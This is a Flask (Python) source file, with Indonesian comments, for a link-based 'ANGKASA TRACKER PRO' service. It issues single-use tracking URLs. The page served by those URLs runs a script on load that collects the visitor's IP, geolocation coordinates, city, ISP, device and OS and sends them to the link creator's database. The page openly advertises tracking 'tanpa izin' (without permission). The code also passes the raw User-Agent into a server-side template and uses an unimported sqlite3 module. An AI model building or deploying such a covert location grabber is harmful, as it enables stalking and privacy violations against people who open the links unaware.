#!/usr/bin/env python3
from flask import Blueprint, request, jsonify, render_template_string, send_from_directory, abort
import secrets
import string
import os
import sys
import json
from datetime import datetime

# Tambahkan path untuk import database
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'database'))
from data_tracker import get_db_connection, init_tracker_db

data_tracker_bp = Blueprint('data_tracker', __name__, url_prefix='/tracker')

# Inisialisasi database saat pertama kali diimport
init_tracker_db()

# ==================== HELPER FUNCTIONS ====================

def generate_endpoint_token(length=35):
    """Generate token unik untuk endpoint"""
    alphabet = string.ascii_letters + string.digits + '_-+'
    return ''.join(secrets.choice(alphabet) for _ in range(length))

def get_client_ip():
    """Mendapatkan IP address client yang sebenarnya"""
    # Cek header proxy
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    return ip

def get_geo_data_from_ip(ip):
    """Ambil data geolokasi dari IP menggunakan ipapi.co"""
    import requests
    try:
        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        data = resp.json()
        if data and 'error' not in data:
            return {
                'city': data.get('city', '-'),
                'region': data.get('region', '-'),
                'country': data.get('country_name', '-'),
                'country_code': data.get('country_code', '-'),
                'lat': data.get('latitude', 0),
                'lon': data.get('longitude', 0),
                'isp': data.get('org', '-'),
                'ip': data.get('ip', ip)
            }
    except Exception as e:
        print(f"Geo lookup error: {e}")
    
    return {
        'city': '-',
        'region': '-',
        'country': '-',
        'country_code': '-',
        'lat': 0,
        'lon': 0,
        'isp': '-',
        'ip': ip
    }

def get_device_info():
    """Ambil info device dari User-Agent"""
    ua = request.headers.get('User-Agent', '')
    
    # Device type
    device = 'Desktop'
    if 'Mobile' in ua or 'Android' in ua:
        device = 'Mobile'
    elif 'iPad' in ua or 'Tablet' in ua:
        device = 'Tablet'
    
    # OS
    os = 'Unknown'
    if 'Windows NT 10.0' in ua: os = 'Windows 11/10'
    elif 'Windows NT 6.1' in ua: os = 'Windows 7'
    elif 'Mac OS X' in ua: os = 'macOS'
    elif 'Android' in ua: os = 'Android'
    elif 'iPhone' in ua or 'iPad' in ua: os = 'iOS'
    elif 'Linux' in ua: os = 'Linux'
    
    # Browser
    browser = 'Other'
    if 'Edg' in ua: browser = 'Edge'
    elif 'Chrome' in ua and 'Edg' not in ua: browser = 'Chrome'
    elif 'Firefox' in ua: browser = 'Firefox'
    elif 'Safari' in ua and 'Chrome' not in ua: browser = 'Safari'
    
    return {'device': device, 'os': os, 'browser': browser}

# ==================== TRACKING PAGE (HTML) ====================

TRACKER_PAGE_HTML = '''<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANGKASA TRACKER PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at 20% 30%, #0a0f1e, #03050b);
            min-height: 100vh;
            padding: 24px 16px;
            color: #eef5ff;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .glow-header { text-align: center; margin-bottom: 40px; }
        .glow-header h1 {
            font-size: 2.8rem;
            font-weight: 800;
            background: linear-gradient(135deg, #c084fc, #60a5fa, #f472b6);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .card {
            background: rgba(15, 25, 45, 0.65);
            backdrop-filter: blur(12px);
            border-radius: 28px;
            padding: 22px;
            border: 1px solid rgba(96, 165, 250, 0.25);
            max-width: 800px;
            margin: 0 auto;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255,255,255,0.06);
        }
        .info-label { color: #9ca8cf; }
        .info-value { font-weight: 600; font-family: monospace; }
        .map-link { color: #7aa2f7; text-decoration: none; }
        .status-badge {
            padding: 8px 12px;
            border-radius: 36px;
            text-align: center;
            margin-top: 12px;
            background: rgba(0,0,0,0.4);
        }
        .success { background: rgba(34,197,94,0.2); color: #86efac; }
        .error { background: rgba(239,68,68,0.2); color: #fca5a5; }
    </style>
</head>
<body>
<div class="container">
    <div class="glow-header">
        <h1>🛸 ANGKASA TRACKER PRO</h1>
        <p>IP Geolocation Master | Auto Track Tanpa Izin</p>
    </div>
    <div class="card">
        <h3>🌍 DATA LOKASI ANDA</h3>
        <div id="tracker-data">
            <div class="info-row"><span class="info-label">🌐 IP Publik</span><span class="info-value" id="ip">Memuat...</span></div>
            <div class="info-row"><span class="info-label">📌 Koordinat</span><span class="info-value" id="coord">-</span></div>
            <div class="info-row"><span class="info-label">📍 Lokasi</span><span class="info-value" id="location">-</span></div>
            <div class="info-row"><span class="info-label">📡 ISP</span><span class="info-value" id="isp">-</span></div>
            <div class="info-row"><span class="info-label">📱 Perangkat</span><span class="info-value" id="device">-</span></div>
            <div class="info-row"><span class="info-label">💻 OS & Browser</span><span class="info-value" id="browser">-</span></div>
        </div>
        <div id="status" class="status-badge">⏳ Mengirim data...</div>
    </div>
</div>
<script>
    async function trackAndSend() {
        const statusDiv = document.getElementById('status');
        try {
            // Ambil data dari ipapi.co
            const resp = await fetch('https://ipapi.co/json/');
            const data = await resp.json();
            
            document.getElementById('ip').innerText = data.ip;
            if (data.latitude && data.longitude) {
                document.getElementById('coord').innerHTML = `${data.latitude}, ${data.longitude} <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}" target="_blank" class="map-link">🗺️ peta</a>`;
            }
            let location = data.city || '';
            if (data.region) location += location ? `, ${data.region}` : data.region;
            if (data.country_name) location += location ? `, ${data.country_name}` : data.country_name;
            document.getElementById('location').innerText = location || '-';
            document.getElementById('isp').innerText = data.org || '-';
            
            // Device info dari browser
            const ua = navigator.userAgent;
            let device = 'Desktop';
            if (/Mobile|Android|iPhone|iPod/i.test(ua)) device = 'Mobile';
            else if (/iPad|Tablet/i.test(ua)) device = 'Tablet';
            document.getElementById('device').innerText = device;
            
            let os = 'Unknown';
            if (ua.includes('Windows NT 10.0')) os = 'Windows 11/10';
            else if (ua.includes('Mac OS X')) os = 'macOS';
            else if (ua.includes('Android')) os = 'Android';
            else if (/(iPhone|iPad|iPod)/.test(ua)) os = 'iOS';
            document.getElementById('browser').innerText = os;
            
            // Kirim ke server
            const sendResp = await fetch('/tracker/api/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    endpoint_id: '{{ endpoint_id }}',
                    geo_data: data,
                    device_info: { device: device, os: os, browser: '{{ browser }}' }
                })
            });
            
            const result = await sendResp.json();
            if (result.success) {
                statusDiv.innerHTML = '✅ Data berhasil dikirim!';
                statusDiv.className = 'status-badge success';
            } else {
                statusDiv.innerHTML = '⚠️ ' + (result.error || 'Gagal mengirim data');
                statusDiv.className = 'status-badge error';
            }
        } catch(e) {
            statusDiv.innerHTML = '❌ Error: ' + e.message;
            statusDiv.className = 'status-badge error';
        }
    }
    trackAndSend();
</script>
</body>
</html>'''

NOT_FOUND_PAGE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Not Found</title><style>body{background:#0a0f1e;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace;}</style></head>
<body><div style="text-align:center"><h1>🔒 404</h1><p>Link ini sudah digunakan atau tidak valid.</p><p>Setiap link hanya bisa digunakan oleh 1 orang pertama yang membukanya.</p></div></body>
</html>'''

# ==================== ROUTES ====================

@data_tracker_bp.route('/')
def tracker_index():
    """Halaman utama tracker - redirect ke data tracker dashboard"""
    return send_from_directory(os.path.join(os.path.dirname(__file__), '..', 'html'), 'data-tracker.html')

@data_tracker_bp.route('/html/<path:filename>')
def serve_tracker_html(filename):
    """Serve HTML files dari folder tracker/html"""
    html_dir = os.path.join(os.path.dirname(__file__), '..', 'html')
    return send_from_directory(html_dir, filename)

@data_tracker_bp.route('/api/create-endpoint', methods=['POST'])
def create_endpoint():
    """Buat endpoint unik baru"""
    data = request.json
    endpoint_name = data.get('name', '').strip()
    
    if not endpoint_name:
        return jsonify({'success': False, 'error': 'Nama endpoint diperlukan'}), 400
    
    token = generate_endpoint_token(35)
    endpoint_id = f"track_{token}"
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    try:
        cursor.execute('''
            INSERT INTO tracker_data (endpoint_id, endpoint_name, endpoint_token)
            VALUES (?, ?, ?)
        ''', (endpoint_id, endpoint_name, token))
        conn.commit()
        
        endpoint_url = f"https://companel.shop/tracker/view?token={token}"
        
        return jsonify({
            'success': True,
            'endpoint_id': endpoint_id,
            'endpoint_name': endpoint_name,
            'endpoint_url': endpoint_url,
            'token': token
        })
    except sqlite3.IntegrityError:
        return jsonify({'success': False, 'error': 'Gagal membuat endpoint, coba lagi'}), 500
    finally:
        conn.close()

@data_tracker_bp.route('/api/endpoints', methods=['GET'])
def list_endpoints():
    """List semua endpoint yang sudah dibuat"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT endpoint_id, endpoint_name, endpoint_token, is_used, used_by_ip, used_at, created_at, last_seen,
               visitor_city, visitor_region, visitor_country, visitor_lat, visitor_lon
        FROM tracker_data 
        ORDER BY created_at DESC
    ''')
    
    endpoints = []
    for row in cursor.fetchall():
        endpoints.append({
            'endpoint_id': row['endpoint_id'],
            'endpoint_name': row['endpoint_name'],
            'endpoint_token': row['endpoint_token'],
            'is_used': row['is_used'] == 1,
            'used_by_ip': row['used_by_ip'],
            'used_at': row['used_at'],
            'created_at': row['created_at'],
            'last_seen': row['last_seen'],
            'visitor_city': row['visitor_city'],
            'visitor_region': row['visitor_region'],
            'visitor_country': row['visitor_country'],
            'visitor_lat': row['visitor_lat'],
            'visitor_lon': row['visitor_lon']
        })
    
    conn.close()
    return jsonify({'success': True, 'endpoints': endpoints})

@data_tracker_bp.route('/api/endpoint/<token>/logs', methods=['GET'])
def get_endpoint_logs(token):
    """Ambil log kunjungan untuk endpoint tertentu"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT visitor_ip, visitor_city, visitor_region, visitor_country, 
               visitor_lat, visitor_lon, visitor_isp, visitor_device, visitor_os, visited_at
        FROM tracker_logs 
        WHERE endpoint_id = (SELECT endpoint_id FROM tracker_data WHERE endpoint_token = ?)
        ORDER BY visited_at DESC
    ''', (token,))
    
    logs = []
    for row in cursor.fetchall():
        logs.append({
            'visitor_ip': row['visitor_ip'],
            'visitor_city': row['visitor_city'],
            'visitor_region': row['visitor_region'],
            'visitor_country': row['visitor_country'],
            'visitor_lat': row['visitor_lat'],
            'visitor_lon': row['visitor_lon'],
            'visitor_isp': row['visitor_isp'],
            'visitor_device': row['visitor_device'],
            'visitor_os': row['visitor_os'],
            'visited_at': row['visited_at']
        })
    
    conn.close()
    return jsonify({'success': True, 'logs': logs})

@data_tracker_bp.route('/view')
def view_tracker():
    """Halaman tracking untuk endpoint unik - hanya 1 orang pertama"""
    token = request.args.get('token', '')
    
    if not token:
        return NOT_FOUND_PAGE, 404
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Cek apakah endpoint valid dan belum digunakan
    cursor.execute('''
        SELECT endpoint_id, endpoint_name, is_used, used_by_ip 
        FROM tracker_data WHERE endpoint_token = ?
    ''', (token,))
    
    row = cursor.fetchone()
    
    if not row:
        conn.close()
        return NOT_FOUND_PAGE, 404
    
    client_ip = get_client_ip()
    
    if row['is_used'] == 1:
        # Cek apakah IP yang sama dengan yang pertama (boleh akses lagi)
        if row['used_by_ip'] != client_ip:
            conn.close()
            return NOT_FOUND_PAGE, 404
    
    if row['is_used'] == 0:
        # Pertama kali digunakan, update status
        cursor.execute('''
            UPDATE tracker_data 
            SET is_used = 1, used_by_ip = ?, used_at = CURRENT_TIMESTAMP
            WHERE endpoint_token = ?
        ''', (client_ip, token))
        conn.commit()
    
    conn.close()
    
    # Render halaman tracker dengan endpoint_id
    from flask import render_template_string
    return render_template_string(TRACKER_PAGE_HTML, endpoint_id=row['endpoint_id'], browser=request.headers.get('User-Agent', ''))

@data_tracker_bp.route('/api/track', methods=['POST'])
def track_data():
    """Endpoint untuk menerima data tracking dari halaman"""
    data = request.json
    endpoint_id = data.get('endpoint_id')
    geo_data = data.get('geo_data', {})
    device_info = data.get('device_info', {})
    
    if not endpoint_id:
        return jsonify({'success': False, 'error': 'endpoint_id diperlukan'}), 400
    
    client_ip = get_client_ip()
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Update data utama
    cursor.execute('''
        UPDATE tracker_data 
        SET visitor_ip = ?, visitor_city = ?, visitor_region = ?, visitor_country = ?,
            visitor_lat = ?, visitor_lon = ?, visitor_isp = ?, 
            visitor_device = ?, visitor_os = ?, visitor_browser = ?,
            last_seen = CURRENT_TIMESTAMP
        WHERE endpoint_id = ?
    ''', (
        client_ip,
        geo_data.get('city', '-'),
        geo_data.get('region', '-'),
        geo_data.get('country_name', '-'),
        geo_data.get('latitude', 0),
        geo_data.get('longitude', 0),
        geo_data.get('org', '-'),
        device_info.get('device', '-'),
        device_info.get('os', '-'),
        device_info.get('browser', '-'),
        endpoint_id
    ))
    
    # Insert log kunjungan
    cursor.execute('''
        INSERT INTO tracker_logs (endpoint_id, visitor_ip, visitor_city, visitor_region, 
            visitor_country, visitor_lat, visitor_lon, visitor_isp, visitor_device, visitor_os)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        endpoint_id,
        client_ip,
        geo_data.get('city', '-'),
        geo_data.get('region', '-'),
        geo_data.get('country_name', '-'),
        geo_data.get('latitude', 0),
        geo_data.get('longitude', 0),
        geo_data.get('org', '-'),
        device_info.get('device', '-'),
        device_info.get('os', '-')
    ))
    
    conn.commit()
    conn.close()
    
    return jsonify({'success': True, 'message': 'Data tersimpan'})